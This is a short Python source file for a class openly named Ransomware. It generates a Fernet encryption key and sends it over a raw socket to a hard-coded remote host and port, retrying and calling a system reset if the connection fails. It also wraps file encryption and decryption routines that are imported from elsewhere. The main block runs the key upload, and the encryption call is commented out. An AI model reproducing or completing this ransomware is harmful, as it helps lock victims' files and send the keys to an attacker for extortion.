# Import modules
import sys
import os.path

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))


from time import sleep
from lib.system import System
from lib.cryptography.encdec import Fernet, Encrypt, Decrypt
from socket import socket, AF_INET, SOCK_STREAM


class Ransomware:
    
    def __init__(self, host: str, port: int) -> None:
        self.key = Fernet.generate_key()
        self.host = host
        self.port = port
        self.system: System = System()
        self.server: socket = socket(AF_INET, SOCK_STREAM)
        self.Private = Fernet(self.key)

    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(self.key)
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    System.reset()
            finally:
                self.server.close()
    
    def Encrypted(self):
        Encrypt(self.Private)
    
    def Decrypted(self):
        Decrypt(self.Private)


if __name__ == '__main__':
    bot = Ransomware('192.168.1.12', 19100)
    bot.ConnectServer()
    #bot.Encrypted()